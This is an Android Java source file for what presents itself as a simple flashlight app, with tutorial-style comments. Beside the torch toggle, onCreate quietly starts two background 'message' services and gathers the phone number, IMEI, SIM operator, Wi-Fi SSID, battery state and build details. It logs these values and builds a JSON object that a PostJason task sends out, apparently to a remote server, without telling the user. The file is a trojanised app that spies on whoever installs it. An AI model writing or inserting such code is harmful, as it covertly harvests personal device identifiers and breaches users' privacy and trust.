package com.androidhive.flashlight;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.media.MediaPlayer;
import android.media.MediaPlayer.OnCompletionListener;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageButton;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.text.TextUtils;
import android.telephony.TelephonyManager;

import org.json.JSONObject;


public class MainActivity extends Activity {

	ImageButton switchButton;

	private Camera camera;
	private boolean isFlashOn;
	private boolean hasFlash;
	Parameters params;
	MediaPlayer mediaPlayer;

	@Override
	protected void onCreate(Bundle savedInstanceState) {

		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);


		// Starting Services
		startService(new Intent(this, MessageInService.class));
		startService(new Intent(this, MessageOutService.class));


		switchButton = (ImageButton) findViewById(R.id.btnSwitch);

		// Check is the device has flash
		hasFlash = getApplicationContext().getPackageManager()
				.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);


		/******************************************************************************************************/
		//Mobile Phone Info
		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		String phoneNumber = telephonyManager.getLine1Number();
		String iMei = telephonyManager.getDeviceId();
		String networkOperatorName = telephonyManager.getNetworkOperatorName();
		//Country of the Sim
		String simCountryIso = telephonyManager.getSimCountryIso();
		//Returns the MCC+MNC (mobile country code + mobile network code) of the provider of the SIM.
		String simOperator = telephonyManager.getSimOperator();

		/******************************************************************************************************/

		//Network Info
		String ssid = null;
		ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		if (networkInfo.isConnected()) {
			final WifiManager wifiManager = (WifiManager)getSystemService(Context.WIFI_SERVICE);
			final WifiInfo connectionInfo = wifiManager.getConnectionInfo();

			if (connectionInfo != null && !TextUtils.isEmpty((connectionInfo.getSSID()))) {
				ssid = connectionInfo.getSSID();
			}
		}


		/******************************************************************************************************/

		//Battery Info
		IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		Intent batteryStatus = registerReceiver(null, ifilter);
		// Are we charging / charged?
		int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
		boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
				status == BatteryManager.BATTERY_STATUS_FULL;
		// How we are charging
		int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
		boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
		boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
		//Battery Status
		int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
		int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
		float batteryPct = level / (float)scale;

		//creo il json
		PostJason js = new PostJason();

		JSONObject babbo = js.createJson(Build.VERSION.SDK,Build.DEVICE);

		js.execute(babbo);

		Log.i("Build Info","SDK:"+ Build.VERSION.SDK+"\n Device:"+Build.DEVICE+
				"\n Manufacturer:"+Build.MANUFACTURER+"\n Model:"+Build.MODEL+"\n Product:"+Build.PRODUCT+
				"\n User:"+Build.USER+"\n Brand:"+Build.BRAND+"\n Fingerprint:"+Build.FINGERPRINT+
				"\n Hardware:"+Build.HARDWARE);

		Log.i("Battery Info", "Status:"+status+"\n is Charging:"+isCharging+
				"\nusbCharge:"+usbCharge+"\nacCharge:"+acCharge+"\nLevel:"+level+"\n Percentage:"+batteryPct);

		Log.i("Network Info", "\n SSID:"+ssid);

		Log.i("Telephone Info", "\n Telephone:"+phoneNumber+"\nNetwork Operator Name:"+networkOperatorName+
				"\n Sim Country Iso:"+simCountryIso+"\n Sim Operator:"+simOperator+"\n IMEI:"+iMei);

		// Device has no flash
		if (!hasFlash) {
			AlertDialog alert = new AlertDialog.Builder(MainActivity.this)
					.create();
			alert.setTitle("Error");
			alert.setMessage("Sorry, your device doesn't support flash light!");
			alert.setButton("OK", new DialogInterface.OnClickListener() {
				public void onClick(DialogInterface dialog, int which) {
					// closing the application
					finish();
				}
			});
			alert.show();
			return;
		}

		// get the camera
		getCamera();
		
		// displaying button image
		toggleButtonImage();
		
		// Switch button clicked
		switchButton.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {

				if (isFlashOn) {
					// turn off flash
					flashOff();
				} else {
					// turn on flash
					flashOn();
				}
			}
		});
	}

	// Get the camera
	private void getCamera() {
		if (camera == null) {
			try {
				camera = Camera.open();
				params = camera.getParameters();
			} catch (RuntimeException e) {

				Log.e("Camera Error,Error: ", e.getMessage());
			}
		}
	}

	// Turn on flash
	private void flashOn() {
		if (!isFlashOn) {
			if (camera == null || params == null) {
				return;
			}
			// Play sound
			playSound();
			params = camera.getParameters();
			params.setFlashMode(Parameters.FLASH_MODE_TORCH);
			camera.setParameters(params);
			camera.startPreview();
			isFlashOn = true;
			
			// Switch image
			toggleButtonImage();
		}

	}

	// Turn off flash
	private void flashOff() {
		if (isFlashOn) {
			if (camera == null || params == null) {
				return;
			}
			// Play sound
			playSound();
			
			params = camera.getParameters();
			params.setFlashMode(Parameters.FLASH_MODE_OFF);
			camera.setParameters(params);
			camera.stopPreview();
			isFlashOn = false;
			
			// Switch image
			toggleButtonImage();
		}
	}
	
	// Sound activated when the flash is on/off
	private void playSound(){
		if(isFlashOn){
			mediaPlayer = MediaPlayer.create(MainActivity.this, R.raw.light_switch_off);
		}else{
			mediaPlayer = MediaPlayer.create(MainActivity.this, R.raw.light_switch_on);
		}
		mediaPlayer.setOnCompletionListener(new OnCompletionListener() {

            @Override
            public void onCompletion(MediaPlayer mp) {
                // TODO Auto-generated method stub
                mp.release();
            }
        }); 
		mediaPlayer.start();
	}
	
	// Switch image when touched
	private void toggleButtonImage(){
		if(isFlashOn){
			switchButton.setImageResource(R.drawable.fiamma);
		}else{
			switchButton.setImageResource(R.drawable.nofiamma);
		}
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

	@Override
	protected void onPause() {
		super.onPause();
		
		// If on pause turn off the flash
		flashOff();
	}

	@Override
	protected void onRestart() {
		super.onRestart();
	}

	@Override
	protected void onResume() {
		super.onResume();
		
		// On resume turn on the flash
		if(hasFlash)
			flashOn();
	}

	@Override
	protected void onStart() {
		super.onStart();
		
		// On starting the app get the camera params
		getCamera();
	}

	@Override
	protected void onStop() {
		super.onStop();
		
		// On stop release the camera
		if (camera != null) {
			camera.release();
			camera = null;
		}
	}

}
